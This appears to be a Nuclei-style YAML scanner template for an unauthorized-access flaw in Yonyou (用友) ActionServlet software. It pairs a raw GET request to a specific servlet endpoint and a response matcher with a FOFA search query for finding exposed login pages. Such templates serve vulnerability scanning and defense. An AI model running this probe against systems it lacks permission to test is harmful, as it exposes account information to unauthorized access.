content:
id: yongyou-infoleak

info:
  name: 用友 com.ufida.web.action.ActionServlet 未授权访问
  author: m0be1
  severity: medium
  description: 用友 com.ufida.web.action.ActionServlet 未授权访问,攻击者可通过此漏洞获取账户信息。
  
  reference:
    - https://
  metadata: 
    fofa-query: body="产品登录界面"
    verified: true
    max-request: 1

http:
  - raw:
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeedID=&TableedID= HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"发布 - IUFO")'
help: 用友 com.ufida.web.action.ActionServlet 未授权访问,攻击者可通过此漏洞获取账户信息。
author: wdnmd0399
